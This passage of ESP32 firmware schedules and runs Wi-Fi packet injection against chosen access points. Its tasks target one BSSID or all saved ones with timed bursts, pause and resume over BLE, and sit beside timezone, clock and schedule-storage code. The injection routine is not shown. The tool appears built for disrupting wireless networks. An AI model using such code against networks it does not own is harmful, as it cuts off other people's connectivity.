          ? static_cast<uint32_t>(time(nullptr)) : 0;
      if (tickActionInstanceClock(activeActionInstance, millis(), nowUtc,
                                  actionPauseRequested)) {
        Serial.println("[Action] Action All timing completed.");
        break;
      }
      if (actionYieldRequested && !txAbortRequested) {
        Serial.println("[Scheduler] Active Action yielding to a due scheduled Action.");
        break;
      }
      if (actionPauseRequested) {
        if (!pauseEventSent) {
          Serial.println("[Action] Action All paused.");
          sendBLEMessage("{\"event\":\"TX_PAUSED\",\"action\":\"ACTION_ALL\"}");
          if (activeActionInstance.state != ACTION_INSTANCE_EMPTY) {
            activeActionInstance.state = ACTION_INSTANCE_PAUSED;
          }
          pauseEventSent = true;
          notifyNetworkSavePaused();
        }
        vTaskDelay(pdMS_TO_TICKS(10));
        continue;
      }
      if (pauseEventSent) {
        Serial.println("[Action] Action All resumed.");
        sendBLEMessage("{\"event\":\"TX_RESUMED\",\"action\":\"ACTION_ALL\"}");
        if (activeActionInstance.state != ACTION_INSTANCE_EMPTY) {
          activeActionInstance.state = ACTION_INSTANCE_RUNNING;
        }
        pauseEventSent = false;
      }
      const bool timingCyclePaused = activeActionInstance.timingConfigured &&
          activeActionInstance.timingPhase == ACTION_TIMING_PAUSE;
      if (!timingCyclePaused && millis() - lastDebugPrintMs >= 1000) {
        //Serial.printf("TX_ALL_START\n");
        //Serial.printf("TCommand: %s\n", command);
        for (size_t i = 0; i <= index.length(); ++i) {
          if (txAbortRequested) break;

          const char c = (i < index.length()) ? index[i] : ',';
          if (c == ',') {
            currentBssid.trim();
            if (currentBssid.length() > 0) {
              const String key = storageKeyForBssid(currentBssid);
              String savedJson = savedPreferences.getString(key.c_str(), "");
              
              int chanIndex = savedJson.indexOf("\"channel\":");
              if (chanIndex != -1) {
                int start = chanIndex + 10;
                int end = savedJson.indexOf(",", start);
                if (end == -1) end = savedJson.indexOf("}", start);
                
                if (end != -1) {
                  uint8_t savedChannel = (uint8_t)savedJson.substring(start, end).toInt();
                  if (savedChannel >= 1 && savedChannel <= 196) {
                    Serial.printf("[WiFi TX ALL] Targeting saved AP: %s on Channel %d\n", currentBssid.c_str(), savedChannel);
                    injectActionPacket(currentBssid, savedChannel, durationSeconds, burstSeconds, sleepSeconds);
                  }
                }
              }
            }
            currentBssid = "";
          } else {
            currentBssid += c;
          }
        }
        lastDebugPrintMs = millis();
      }
      // Yield briefly so the scheduler and other FreeRTOS tasks can run.
      vTaskDelay(pdMS_TO_TICKS(1));
    }

    if (!actionYieldRequested || txAbortRequested) {
      if (txAbortRequested) {
        sendBLEMessage("{\"event\":\"TX_ALL_ABORTED\"}");
      } else {
        sendBLEMessage("{\"event\":\"TX_ALL_DONE\"}");
      }
    }
  } else {
    txAbortRequested = false;
    String payload = String(command + 7);
    
    String tokens[4] = {"", "1", "0", "0"};
    int tokenCount = 0;
    int lastIndex = 0;
    
    for (int i = 0; i <= payload.length(); i++) {
      if (i == payload.length() || payload[i] == ',') {
        if (tokenCount < 4) {
          tokens[tokenCount++] = payload.substring(lastIndex, i);
        }
        lastIndex = i + 1;
      }
    }

    String targetBssid = tokens[0];
    targetBssid.trim();
    
    uint32_t durationSeconds = tokens[1].toInt();
    uint32_t burstSeconds    = tokens[2].toInt();
    uint32_t sleepSeconds    = tokens[3].toInt();

    APRecord ap;

    while (!txAbortRequested) {
      const uint32_t nowUtc = timeSynced
          ? static_cast<uint32_t>(time(nullptr)) : 0;
      if (tickActionInstanceClock(activeActionInstance, millis(), nowUtc,
                                  actionPauseRequested)) {
        Serial.println("[Action] Individual Action timing completed.");
        break;
      }
      if (actionYieldRequested && !txAbortRequested) {
        Serial.println("[Scheduler] Active Action yielding to a due scheduled Action.");
        break;
      }
      if (actionPauseRequested) {
        if (!pauseEventSent) {
          Serial.println("[Action] Individual Action paused.");
          sendBLEMessage("{\"event\":\"TX_PAUSED\",\"action\":\"ACTION\"}");
          if (activeActionInstance.state != ACTION_INSTANCE_EMPTY) {
            activeActionInstance.state = ACTION_INSTANCE_PAUSED;
          }
          pauseEventSent = true;
          notifyNetworkSavePaused();
        }
        vTaskDelay(pdMS_TO_TICKS(10));
        continue;
      }
      if (pauseEventSent) {
        Serial.println("[Action] Individual Action resumed.");
        sendBLEMessage("{\"event\":\"TX_RESUMED\",\"action\":\"ACTION\"}");
        if (activeActionInstance.state != ACTION_INSTANCE_EMPTY) {
          activeActionInstance.state = ACTION_INSTANCE_RUNNING;
        }
        pauseEventSent = false;
      }
      const bool timingCyclePaused = activeActionInstance.timingConfigured &&
          activeActionInstance.timingPhase == ACTION_TIMING_PAUSE;
      if (!timingCyclePaused && millis() - lastDebugPrintMs >= 1000) {
        //Serial.printf("TX_START\n");
        //Serial.printf("TCommand: %s\n", command);
        if (findLastScanAP(targetBssid, ap)) {
          injectActionPacket(ap.bssid, ap.channel, durationSeconds, burstSeconds, sleepSeconds);
        } else {
          const String key = storageKeyForBssid(targetBssid);
          if (savedPreferences.isKey(key.c_str())) {
            String savedJson = savedPreferences.getString(key.c_str(), "");
            int chanIndex = savedJson.indexOf("\"channel\":");
            if (chanIndex != -1) {
              int start = chanIndex + 10;
              int end = savedJson.indexOf(",", start);
              if (end == -1) end = savedJson.indexOf("}", start);
              
              if (end != -1) {
                String chanStr = savedJson.substring(start, end);
                uint8_t savedChannel = (uint8_t)chanStr.toInt();
                
                if (savedChannel >= 1 && savedChannel <= 196) {
                  Serial.printf("[WiFi TX] Flash lookup hit. Targeting channel: %d\n", savedChannel);
                  injectActionPacket(targetBssid, savedChannel, durationSeconds, burstSeconds, sleepSeconds);
                } else {
                  sendBLEMessage("{\"event\":\"TX_ERROR\",\"reason\":\"SAVED_AP_CHANNEL_INVALID\"}");
                }
              } else {
                sendBLEMessage("{\"event\":\"TX_ERROR\",\"reason\":\"SAVED_AP_PARSE_FAILED\"}");
              }
            } else {
              sendBLEMessage("{\"event\":\"TX_ERROR\",\"reason\":\"SAVED_AP_MISSING_CHANNEL_DATA\"}");
            }
          } else {
            sendBLEMessage("{\"event\":\"TX_ERROR\",\"reason\":\"UNKNOWN_TARGET_BSSID\"}");
          }
        }
        lastDebugPrintMs = millis();
      }
      // Yield briefly so the scheduler and other FreeRTOS tasks can run.
      vTaskDelay(pdMS_TO_TICKS(1));
    }

    if (!actionYieldRequested || txAbortRequested) {
      if (txAbortRequested) {
        sendBLEMessage("{\"event\":\"TX_ABORTED\"}");
      } else {
        sendBLEMessage("{\"event\":\"TX_DONE\"}");
      }
    }
  }

  const bool wasAborted = txAbortRequested;
  const bool yieldedForSchedule = actionYieldRequested && !wasAborted &&
      activeActionInstance.state != ACTION_INSTANCE_EMPTY;

  if (yieldedForSchedule) {
    activeActionInstance.state = ACTION_INSTANCE_PAUSED;
    activeActionInstance.lastTimingUpdateMs = millis();
    if (pushInterruptedAction(activeActionInstance)) {
      Serial.printf("[Scheduler] Paused instance %lu (schedule %u) and saved it on the interruption stack.\n",
                    static_cast<unsigned long>(activeActionInstance.instanceId),
                    static_cast<unsigned int>(activeActionInstance.scheduleId));
      sendBLEMessage(wifiScanPauseActive
          ? "{\"event\":\"TX_PAUSED\",\"reason\":\"WIFI_SCAN\"}"
          : (pendingManualActionStart
              ? "{\"event\":\"TX_PAUSED\",\"reason\":\"MANUAL_INTERRUPT\"}"
              : "{\"event\":\"TX_PAUSED\",\"reason\":\"SCHEDULE_INTERRUPT\"}"));
    } else {
      Serial.println("[Scheduler] ERROR: interruption stack is full; Action could not be saved.");
      // Keep the original Action alive rather than silently losing its state.
      activeActionInstance.state = ACTION_INSTANCE_RUNNING;
      actionYieldRequested = false;
      actionPauseRequested = false;
      while (!txAbortRequested) {
        vTaskDelay(pdMS_TO_TICKS(10));
      }
      Serial.println(isAllAction ? "TX_ALL_ABORTED" : "TX_ABORTED");
      sendBLEMessage(isAllAction
          ? "{\"event\":\"TX_ALL_ABORTED\"}"
          : "{\"event\":\"TX_ABORTED\"}");
    }
  } else if (isAllAction) {
    Serial.println(wasAborted ? "TX_ALL_ABORTED" : "TX_ALL_DONE");
    sendBLEMessage(wasAborted
        ? "{\"event\":\"TX_ALL_ABORTED\"}"
        : "{\"event\":\"TX_ALL_DONE\"}");
  } else {
    Serial.println(wasAborted ? "TX_ABORTED" : "TX_DONE");
    sendBLEMessage(wasAborted
        ? "{\"event\":\"TX_ABORTED\"}"
        : "{\"event\":\"TX_DONE\"}");
  }

  actionTaskHandle = nullptr;
  txAbortRequested = false;
  actionPauseRequested = false;
  actionYieldRequested = false;
  actionActive = false;
  memset(&activeActionInstance, 0, sizeof(activeActionInstance));
  // A yield already saved the instance on the LIFO stack. Only now is the
  // foreground runner fully offline and safe for network-storage commands.
  notifyNetworkSavePaused();

  vTaskDelete(nullptr);
}

// Stage 8M: start an already-initialized scheduled ActionInstance using the
// same harmless cooperative Action runner used by manual Actions. The saved
// instance identity and timing values are retained instead of being reset.
bool startScheduledActionTask(const ActionInstance& scheduledInstance) {
  if (actionTaskHandle != nullptr || actionActive ||
      scheduledInstance.state != ACTION_INSTANCE_PENDING ||
      scheduledInstance.scheduleId == 0 ||
      !scheduledInstance.timingConfigured ||
      scheduledInstance.command[0] == '\0' ||
      (scheduledInstance.actionType != SCHEDULE_ACTION_ALL &&
       scheduledInstance.actionType != SCHEDULE_ACTION_INDIVIDUAL)) {
    return false;
  }

  ActionTaskParams* taskParams = new ActionTaskParams;
  if (taskParams == nullptr) return false;

  taskParams->isAllAction =
      scheduledInstance.actionType == SCHEDULE_ACTION_ALL;
  strncpy(taskParams->command, scheduledInstance.command,
          sizeof(taskParams->command) - 1);
  taskParams->command[sizeof(taskParams->command) - 1] = '\0';

  activeActionInstance = scheduledInstance;
  activeActionInstance.state = ACTION_INSTANCE_RUNNING;
  activeActionInstance.lastTimingUpdateMs = millis();
  actionPauseRequested = false;
  actionYieldRequested = false;
  txAbortRequested = false;
  actionActive = true;

  const BaseType_t created = xTaskCreate(
      actionTask,
      taskParams->isAllAction ? "ScheduledAllTask" : "ScheduledActionTask",
      4096,
      taskParams,
      2,
      &actionTaskHandle);

  if (created != pdPASS) {
    delete taskParams;
    actionTaskHandle = nullptr;
    actionActive = false;
    txAbortRequested = false;
    actionPauseRequested = false;
    memset(&activeActionInstance, 0, sizeof(activeActionInstance));
    return false;
  }

  Serial.printf("[Scheduler] Started scheduled instance %lu (schedule %u).\n",
                static_cast<unsigned long>(activeActionInstance.instanceId),
                static_cast<unsigned int>(activeActionInstance.scheduleId));
  return true;
}

// Resume a paused instance, including a manually started Action (scheduleId 0).
// The command and timing snapshot are copied from the saved instance unchanged.
bool startResumedActionTask(const ActionInstance& pausedInstance) {
  if (actionTaskHandle != nullptr || actionActive ||
      pausedInstance.state != ACTION_INSTANCE_PENDING ||
      pausedInstance.instanceId == 0 ||
      pausedInstance.command[0] == '\0' ||
      (pausedInstance.actionType != SCHEDULE_ACTION_ALL &&
       pausedInstance.actionType != SCHEDULE_ACTION_INDIVIDUAL)) {
    return false;
  }

  ActionTaskParams* taskParams = new ActionTaskParams;
  if (taskParams == nullptr) return false;

  taskParams->isAllAction =
      pausedInstance.actionType == SCHEDULE_ACTION_ALL;
  strncpy(taskParams->command, pausedInstance.command,
          sizeof(taskParams->command) - 1);
  taskParams->command[sizeof(taskParams->command) - 1] = '\0';

  activeActionInstance = pausedInstance;
  activeActionInstance.state = ACTION_INSTANCE_RUNNING;
  activeActionInstance.lastTimingUpdateMs = millis();
  actionPauseRequested = false;
  actionYieldRequested = false;
  txAbortRequested = false;
  actionActive = true;

  const BaseType_t created = xTaskCreate(
      actionTask,
      taskParams->isAllAction ? "ResumedAllTask" : "ResumedActionTask",
      4096,
      taskParams,
      2,
      &actionTaskHandle);

  if (created != pdPASS) {
    delete taskParams;
    actionTaskHandle = nullptr;
    actionActive = false;
    txAbortRequested = false;
    actionPauseRequested = false;
    memset(&activeActionInstance, 0, sizeof(activeActionInstance));
    return false;
  }

  return true;
}

// Stage 8M diagnostic: launch a short, harmless Action All instance through
// the scheduled-instance path. It should finish itself after two active seconds.
void testScheduledActionRunnerLaunch() {
  if (actionActive || actionTaskHandle != nullptr ||
      interruptedActionCount != 0) {
    sendSimpleResponse("SCHED_RUNNER_LAUNCH_TEST:BUSY");
    return;
  }

  ActionInstance testInstance = {};
  testInstance.instanceId = nextActionInstanceId++;
  if (nextActionInstanceId == 0) nextActionInstanceId = 1;
  testInstance.scheduleId = 65530;
  testInstance.actionType = SCHEDULE_ACTION_ALL;
  testInstance.state = ACTION_INSTANCE_PENDING;
  testInstance.dueAtUtc = 1;
  testInstance.durationMode = SCHEDULE_ACTIVE_DURATION;
  testInstance.remainingTotalActiveSeconds = 2;
  testInstance.executionDurationSeconds = 0;
  testInstance.remainingExecutionSeconds = 0;
  testInstance.pauseIntervalSeconds = 0;
  testInstance.timingPhase = ACTION_TIMING_ACTIVE;
  testInstance.timingConfigured = true;
  strncpy(testInstance.command, "ACTION_ALL", sizeof(testInstance.command) - 1);

  if (!startScheduledActionTask(testInstance)) {
    sendSimpleResponse("SCHED_RUNNER_LAUNCH_TEST:FAILED");
    return;
  }

  if (activeActionInstance.scheduleId != testInstance.scheduleId ||
      activeActionInstance.instanceId != testInstance.instanceId ||
      !activeActionInstance.timingConfigured ||
      activeActionInstance.state != ACTION_INSTANCE_RUNNING) {
    txAbortRequested = true;
    sendSimpleResponse("SCHED_RUNNER_LAUNCH_TEST:FAILED");
    return;
  }

  Serial.println("[Scheduler] Stage 8M scheduled runner launch test started; expect TX_ALL_DONE after about 2 seconds.");
  sendSimpleResponse("SCHED_RUNNER_LAUNCH_TEST:STARTED");
}

// Stage 8N diagnostic: prove a due queued occurrence is dispatched through
// the scheduled runner, rather than bypassing the pending queue.
void testPendingScheduledActionDispatch() {
  if (actionActive || actionTaskHandle != nullptr || interruptedActionCount != 0 ||
      pendingScheduledActionCount != 0) {
    sendSimpleResponse("SCHED_PENDING_RUNNER_TEST:BUSY");
    return;
  }

  ActionInstance testInstance = {};
  testInstance.instanceId = nextActionInstanceId++;
  if (nextActionInstanceId == 0) nextActionInstanceId = 1;
  testInstance.scheduleId = 65529;
  testInstance.actionType = SCHEDULE_ACTION_ALL;
  testInstance.state = ACTION_INSTANCE_PENDING;
  testInstance.dueAtUtc = 1;
  testInstance.durationMode = SCHEDULE_ACTIVE_DURATION;
  testInstance.remainingTotalActiveSeconds = 2;
  testInstance.timingPhase = ACTION_TIMING_ACTIVE;
  testInstance.timingConfigured = true;
  strncpy(testInstance.command, "ACTION_ALL", sizeof(testInstance.command) - 1);

  if (!enqueuePendingScheduledAction(testInstance) ||
      !dispatchNextPendingScheduledAction(2)) {
    clearPendingScheduledActions();
    sendSimpleResponse("SCHED_PENDING_RUNNER_TEST:FAILED");
    return;
  }

  const bool passed = activeActionInstance.instanceId == testInstance.instanceId &&
      activeActionInstance.scheduleId == testInstance.scheduleId &&
      activeActionInstance.state == ACTION_INSTANCE_RUNNING &&
      activeActionInstance.timingConfigured && pendingScheduledActionCount == 0;

  if (!passed) {
    txAbortRequested = true;
    sendSimpleResponse("SCHED_PENDING_RUNNER_TEST:FAILED");
    return;
  }

  Serial.println("[Scheduler] Stage 8N pending-to-runner dispatch test started; expect TX_ALL_DONE after about 2 seconds.");
  sendSimpleResponse("SCHED_PENDING_RUNNER_TEST:STARTED");
}

bool startActionTask(bool isAllAction, const char* command) {
  if (actionTaskHandle != nullptr) {
    Serial.println("[Action] Rejected: an Action task is already running.");
    return false;
  }

  ActionTaskParams* taskParams = new ActionTaskParams;
  if (taskParams == nullptr) {
    sendBLEMessage("{\"event\":\"TX_ERROR\",\"reason\":\"ACTION_TASK_CREATE_FAILED\"}");
    Serial.println("[Action] Failed to allocate Action task parameters.");
    return false;
  }

  taskParams->isAllAction = isAllAction;
  actionPauseRequested = false;
  actionYieldRequested = false;
  txAbortRequested = false;
  strncpy(taskParams->command, command, sizeof(taskParams->command) - 1);
  taskParams->command[sizeof(taskParams->command) - 1] = '\0';

  memset(&activeActionInstance, 0, sizeof(activeActionInstance));
  activeActionInstance.instanceId = nextActionInstanceId++;
  if (nextActionInstanceId == 0) nextActionInstanceId = 1;
  activeActionInstance.scheduleId = 0;
  activeActionInstance.actionType = isAllAction
      ? SCHEDULE_ACTION_ALL : SCHEDULE_ACTION_INDIVIDUAL;
  activeActionInstance.state = ACTION_INSTANCE_RUNNING;
  activeActionInstance.timingConfigured = false;
  activeActionInstance.lastTimingUpdateMs = millis();
  strncpy(activeActionInstance.command, command,
          sizeof(activeActionInstance.command) - 1);
  activeActionInstance.command[sizeof(activeActionInstance.command) - 1] = '\0';

  actionActive = true;

  const UBaseType_t taskPriority = 2;
  const uint32_t stackSize = 4096;
  const BaseType_t created = xTaskCreate(
      actionTask,
      isAllAction ? "ActionAllTask" : "ActionTask",
      stackSize,
      taskParams,
      taskPriority,
      &actionTaskHandle);

  if (created != pdPASS) {
    delete taskParams;
    actionTaskHandle = nullptr;
    actionActive = false;
    txAbortRequested = false;
    memset(&activeActionInstance, 0, sizeof(activeActionInstance));
    sendBLEMessage("{\"event\":\"TX_ERROR\",\"reason\":\"ACTION_TASK_CREATE_FAILED\"}");
    Serial.println("[Action] Failed to create the Action task.");
    return false;
  }

  Serial.println(isAllAction
      ? "[Action] Action All task started."
      : "[Action] Individual Action task started.");
  return true;
}

bool setDeviceTimeFromCommand(const char* command) {
  // Expected format: SET_TIME:<unix_epoch_seconds>
  const char* value = command + 9;
  if (*value == '\0') {
    sendSimpleResponse("TIME_ERROR:INVALID_TIMESTAMP");
    return false;
  }

  char* endPointer = nullptr;
  const long long epoch = strtoll(value, &endPointer, 10);
  if (endPointer == value || *endPointer != '\0' ||
      epoch < 1704067200LL || epoch > 4102444800LL) {
    sendSimpleResponse("TIME_ERROR:INVALID_TIMESTAMP");
    return false;
  }

  struct timeval currentTime;
  currentTime.tv_sec = static_cast<time_t>(epoch);
  currentTime.tv_usec = 0;

  if (settimeofday(&currentTime, nullptr) != 0) {
    sendSimpleResponse("TIME_ERROR:SET_FAILED");
    Serial.println("[Time] Failed to set the system clock.");
    return false;
  }

  timeSynced = true;
  char response[40];
  snprintf(response, sizeof(response), "TIME_SET:%lld", epoch);
  Serial.printf("[Time] Clock synchronized. Unix time: %lld\n", epoch);
  sendSimpleResponse(response);
  return true;
}

void sendTimeStatus() {
  if (!timeSynced) {
    sendSimpleResponse("TIME_NOT_SET");
    return;
  }

  const time_t now = time(nullptr);
  char response[40];
  snprintf(response, sizeof(response), "TIME_STATUS:%lld", static_cast<long long>(now));
  sendSimpleResponse(response);
}

// Stage 8T: ESP32 newlib uses POSIX TZ rules for local calendar conversion.
// The IANA identifier is still stored separately for display/reference; this
// rule string is what mktime/localtime_r use for DST-aware recurrence math.
static constexpr size_t MAX_POSIX_TZ_RULE_LENGTH = 63;

bool validPosixTimezoneRule(const char* value) {
  if (value == nullptr) return false;
  const size_t length = strlen(value);
  if (length == 0 || length > MAX_POSIX_TZ_RULE_LENGTH) return false;

  bool hasNameCharacter = false;
  for (size_t i = 0; i < length; ++i) {
    const unsigned char c = static_cast<unsigned char>(value[i]);
    const bool allowed =
        (c >= 'A' && c <= 'Z') ||
        (c >= 'a' && c <= 'z') ||
        (c >= '0' && c <= '9') ||
        c == ',' || c == '.' || c == '/' || c == '+' || c == '-' ||
        c == '<' || c == '>' || c == ':';
    if (!allowed) return false;
    if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || c == '<') {
      hasNameCharacter = true;
    }
  }
  return hasNameCharacter;
}

bool applyPosixTimezoneRule(const char* value) {
  if (!validPosixTimezoneRule(value)) return false;
  if (setenv("TZ", value, 1) != 0) return false;
  tzset();
  return true;
}

bool setPosixTimezoneRuleFromCommand(const char* command) {
  // Expected format: SET_TZ_RULE:<POSIX_TZ_rule>
  const char* value = command + 12;
  if (!validPosixTimezoneRule(value)) {
    sendSimpleResponse("TIMEZONE_RULE_ERROR:INVALID_RULE");
    return false;
  }

  const String previousRule = schedulerPreferences.getString("tzrule", "");
  if (!applyPosixTimezoneRule(value)) {
    sendSimpleResponse("TIMEZONE_RULE_ERROR:APPLY_FAILED");
    return false;
  }

  if (schedulerPreferences.putString("tzrule", value) == 0) {
    if (previousRule.isEmpty()) {
      unsetenv("TZ");
      tzset();
    } else {
      applyPosixTimezoneRule(previousRule.c_str());
    }
    sendSimpleResponse("TIMEZONE_RULE_ERROR:SAVE_FAILED");
    return false;
  }

  Serial.printf("[Time] POSIX timezone rule applied: %s\n", value);
  String response = "TIMEZONE_RULE_SET:";
  response += value;
  sendSimpleResponse(response.c_str());
  return true;
}

bool clearPosixTimezoneRule() {
  if (!schedulerPreferences.remove("tzrule")) {
    // A missing key is already the desired state; still clear the process TZ.
    if (schedulerPreferences.getString("tzrule", "").isEmpty()) {
      unsetenv("TZ");
      tzset();
      sendSimpleResponse("TIMEZONE_RULE_CLEARED");
      return true;
    }
    sendSimpleResponse("TIMEZONE_RULE_ERROR:CLEAR_FAILED");
    return false;
  }
  unsetenv("TZ");
  tzset();
  Serial.println("[Time] POSIX timezone rule cleared.");
  sendSimpleResponse("TIMEZONE_RULE_CLEARED");
  return true;
}

void sendPosixTimezoneRuleStatus() {
  const String rule = schedulerPreferences.getString("tzrule", "");
  if (rule.isEmpty()) {
    sendSimpleResponse("TIMEZONE_RULE_NOT_SET");
    return;
  }
  String response = "TIMEZONE_RULE_STATUS:";
  response += rule;
  sendSimpleResponse(response.c_str());
}

// This diagnostic uses a known North American DST rule, checks winter and
// summer UTC-to-local conversion, then restores the user's configured rule.
void testPosixTimezoneRuleConversion() {
  const String savedRule = schedulerPreferences.getString("tzrule", "");
  const char* testRule = "EST5EDT,M3.2.0/2,M11.1.0/2";
  bool passed = applyPosixTimezoneRule(testRule);

  struct tm winterLocal = {};
  struct tm summerLocal = {};
  const time_t winterUtc = static_cast<time_t>(1768478400LL); // 2026-01-15 12:00 UTC
  const time_t summerUtc = static_cast<time_t>(1784116800LL); // 2026-07-15 12:00 UTC
  passed = passed && localtime_r(&winterUtc, &winterLocal) != nullptr &&
      localtime_r(&summerUtc, &summerLocal) != nullptr &&
      winterLocal.tm_year == 126 && winterLocal.tm_mon == 0 &&
      winterLocal.tm_mday == 15 && winterLocal.tm_hour == 7 &&
      winterLocal.tm_isdst == 0 &&
      summerLocal.tm_year == 126 && summerLocal.tm_mon == 6 &&
      summerLocal.tm_mday == 15 && summerLocal.tm_hour == 8 &&
      summerLocal.tm_isdst > 0;

  if (savedRule.isEmpty()) {
    unsetenv("TZ");
    tzset();
  } else {
    applyPosixTimezoneRule(savedRule.c_str());
  }

  if (passed) {
    Serial.println("[Scheduler] Stage 8T POSIX timezone/DST conversion test PASSED.");
    sendSimpleResponse("SCHED_TZ_RULE_TEST:OK");
  } else {
    Serial.println("[Scheduler] Stage 8T POSIX timezone/DST conversion test FAILED.");
    sendSimpleResponse("SCHED_TZ_RULE_TEST:FAILED");
  }
}

bool setDeviceTimezoneFromCommand(const char* command) {
  // Expected format: SET_TIMEZONE:<IANA_timezone_identifier>
  static constexpr size_t MAX_TIMEZONE_LENGTH = 48;
  const char* value = command + 13;
  const size_t length = strlen(value);

  if (length == 0 || length > MAX_TIMEZONE_LENGTH) {
    sendSimpleResponse("TIMEZONE_ERROR:INVALID_LENGTH");
    return false;
  }

  // IANA identifiers use letters, digits, '/', '_', '-', and '+'.
  for (size_t i = 0; i < length; ++i) {
    const char c = value[i];
    const bool allowed =
        (c >= 'A' && c <= 'Z') ||
        (c >= 'a' && c <= 'z') ||
        (c >= '0' && c <= '9') ||
        c == '/' || c == '_' || c == '-' || c == '+';
    if (!allowed) {
      sendSimpleResponse("TIMEZONE_ERROR:INVALID_IDENTIFIER");
      return false;
    }
  }

  if (schedulerPreferences.putString("timezone", value) == 0) {
    sendSimpleResponse("TIMEZONE_ERROR:SAVE_FAILED");
    Serial.println("[Time] Failed to save the phone time-zone identifier.");
    return false;
  }

  Serial.printf("[Time] Phone time zone saved: %s\n", value);
  String response = "TIMEZONE_SET:";
  response += value;
  sendSimpleResponse(response.c_str());
  return true;
}

void sendTimezoneStatus() {
  const String timezoneId = schedulerPreferences.getString("timezone", "");
  if (timezoneId.isEmpty()) {
    sendSimpleResponse("TIMEZONE_NOT_SET");
    return;
  }

  String response = "TIMEZONE_STATUS:";
  response += timezoneId;
  sendSimpleResponse(response.c_str());
}

bool saveSchedulerStorage() {
  schedulerData.version = SCHEDULER_STORAGE_VERSION;
  const size_t written = schedulerPreferences.putBytes(
      SCHEDULER_RECORDS_KEY, &schedulerData, sizeof(schedulerData));
  return written == sizeof(schedulerData);
}

bool loadSchedulerStorage() {
  const size_t storedLength = schedulerPreferences.getBytesLength(SCHEDULER_RECORDS_KEY);

  if (storedLength == 0) {
    memset(&schedulerData, 0, sizeof(schedulerData));
    schedulerData.version = SCHEDULER_STORAGE_VERSION;
    schedulerData.nextId = 1;
    Serial.println("[Scheduler] No Stage 6 records found; creating the new storage layout.");
    Serial.println("[Scheduler] Any Stage 5 'records' data is being left untouched.");
    return saveSchedulerStorage();
  }

  if (storedLength != sizeof(schedulerData)) {
    Serial.println("[Scheduler] Stage 6 data size mismatch; initializing the Stage 6 storage key.");
    memset(&schedulerData, 0, sizeof(schedulerData));
    schedulerData.version = SCHEDULER_STORAGE_VERSION;
    schedulerData.nextId = 1;
    return saveSchedulerStorage();
  }

  if (schedulerPreferences.getBytes(SCHEDULER_RECORDS_KEY, &schedulerData,
                                    sizeof(schedulerData)) != sizeof(schedulerData)) {
    Serial.println("[Scheduler] Failed to read Stage 6 schedule records.");
    return false;
  }

  if (schedulerData.version != SCHEDULER_STORAGE_VERSION ||
      schedulerData.count > MAX_SCHEDULES ||
      schedulerData.nextId == 0) {
    Serial.println("[Scheduler] Invalid Stage 6 data; initializing the Stage 6 storage key.");
    memset(&schedulerData, 0, sizeof(schedulerData));
    schedulerData.version = SCHEDULER_STORAGE_VERSION;
    schedulerData.nextId = 1;
    return saveSchedulerStorage();
  }

  return true;
}

void sendSchedulerCount() {
  char response[32];
  snprintf(response, sizeof(response), "SCHED_COUNT:%u",
           static_cast<unsigned int>(schedulerData.count));
  sendSimpleResponse(response);
}

bool parseUnsignedValue(const char* text, uint32_t& value) {
  if (text == nullptr || *text == '\0') return false;
  char* end = nullptr;
  const unsigned long parsed = strtoul(text, &end, 10);
  if (end == text || *end != '\0') return false;
  value = static_cast<uint32_t>(parsed);
  return true;
}

bool normalizeScheduleTarget(const char* input, uint8_t actionType,
                             char output[18]) {
  if (actionType == SCHEDULE_ACTION_ALL) {
    if (strcmp(input, "-") != 0 && input[0] != '\0') return false;
    output[0] = '\0';
    return true;
  }
  if (actionType != SCHEDULE_ACTION_INDIVIDUAL || strlen(input) != 17) return false;

  uint8_t mac[6];
  if (!parseMacAddress(String(input), mac)) return false;
  snprintf(output, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return true;
}

uint16_t allocateScheduleId() {
  if (schedulerData.nextId == 0) schedulerData.nextId = 1;
  for (uint32_t attempt = 0; attempt < 65535UL; ++attempt) {
    const uint16_t candidate = schedulerData.nextId++;
    if (schedulerData.nextId == 0) schedulerData.nextId = 1;
    bool used = false;
    for (uint8_t i = 0; i < schedulerData.count; ++i) {
      if (schedulerData.records[i].id == candidate) {
        used = true;
        break;
      }
    }
    if (!used && candidate != 0) return candidate;
  }
  return 0;
}

void listSchedules() {
  char response[240];
  sendSimpleResponse("SCHED_LIST_BEGIN");
  for (uint8_t i = 0; i < schedulerData.count; ++i) {
    const ScheduleRecord& record = schedulerData.records[i];
    snprintf(response, sizeof(response),
             "SCHED_ITEM:%u,%u,%u,%s,%u,%u,%u,%u,%u,%u,%lu,%u,%lu,%lu,%u,%u,%u,%lu,%lu,%u",
             static_cast<unsigned int>(record.id),
             static_cast<unsigned int>(record.scheduleType),
             static_cast<unsigned int>(record.actionType),
             record.targetBssid[0] ? record.targetBssid : "-",
             static_cast<unsigned int>(record.startYear),
             static_cast<unsigned int>(record.startMonth),
             static_cast<unsigned int>(record.startDay),
             static_cast<unsigned int>(record.startHour),
             static_cast<unsigned int>(record.startMinute),
             static_cast<unsigned int>(record.weekdays),
             static_cast<unsigned long>(record.startAtUtc),
             static_cast<unsigned int>(record.durationMode),
             static_cast<unsigned long>(record.totalDurationSeconds),
             static_cast<unsigned long>(record.fixedEndAtUtc),
             static_cast<unsigned int>(record.fixedEndDayOffset),
             static_cast<unsigned int>(record.fixedEndHour),
             static_cast<unsigned int>(record.fixedEndMinute),
             static_cast<unsigned long>(record.executionDurationSeconds),
             static_cast<unsigned long>(record.pauseIntervalSeconds),
             record.enabled ? 1U : 0U);
    sendSimpleResponse(response);
  }
  sendSimpleResponse("SCHED_LIST_END");
}

bool isLeapYear(uint16_t year) {
  return (year % 4 == 0 && year % 100 != 0) || (year % 400 == 0);
}

uint8_t daysInMonth(uint16_t year, uint8_t month) {
  static const uint8_t days[] = {31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31};
  if (month < 1 || month > 12) return 0;
  if (month == 2 && isLeapYear(year)) return 29;
  return days[month - 1];
}

bool validLocalDateTime(uint32_t year, uint32_t month, uint32_t day,
                        uint32_t hour, uint32_t minute) {
  if (year < 2024 || year > 2099 || month < 1 || month > 12 ||
      day < 1 || day > daysInMonth(static_cast<uint16_t>(year), static_cast<uint8_t>(month)) ||
      hour > 23 || minute > 59) return false;
  return true;
}

bool parseCsvFields(const char* source, char fields[][24], size_t fieldCount) {
  if (source == nullptr || strlen(source) >= MAX_COMMAND_LENGTH) return false;
  char buffer[MAX_COMMAND_LENGTH] = {0};
  strncpy(buffer, source, sizeof(buffer) - 1);
  char* savePointer = nullptr;
